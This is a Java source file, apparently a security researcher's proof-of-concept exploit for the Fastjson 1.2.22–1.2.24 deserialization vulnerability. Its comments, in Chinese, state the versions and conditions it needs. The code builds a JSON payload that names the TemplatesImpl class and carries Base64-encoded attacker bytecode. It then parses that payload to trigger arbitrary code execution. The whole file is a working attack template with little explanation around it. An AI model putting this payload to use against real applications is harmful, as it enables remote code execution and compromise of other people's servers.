package com.yyjccc.fastjson.exp.low;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.yyjccc.javassist.Calc;
import org.apache.commons.codec.binary.Base64;

/**
 * 版本： Fastjson 1.2.x系列的1.2.22-1.2.24版本 <br/>
 * 条件： 需要设置Feature.SupportNonPublicField <br/>
 * jdk:  需要jdk8  <br/>
 * 描述： 利用fastjson打TemplateImpl字节码加载
 */

public class TemplatesImplPoc {

        public static void main(String args[]) {
                try {
                        ParserConfig config = new ParserConfig();
                        String evilCode = Base64.encodeBase64String(Calc.getCodeByte());
                        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
                        String text = "{\"@type\":\"" + NASTY_CLASS + "\",\n\"_bytecodes\":[\"" + evilCode + "\"],\n\"_name\":\"yyjccc\",\n\"_tfactory\":{ },\n\"_outputProperties\":{ }\n}";
                        System.out.println(text);

                        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
                     //   Object obj2 = JSON.parse(text, Feature.SupportNonPublicField);
                } catch (Exception e) {
                        e.printStackTrace();
                }
        }
}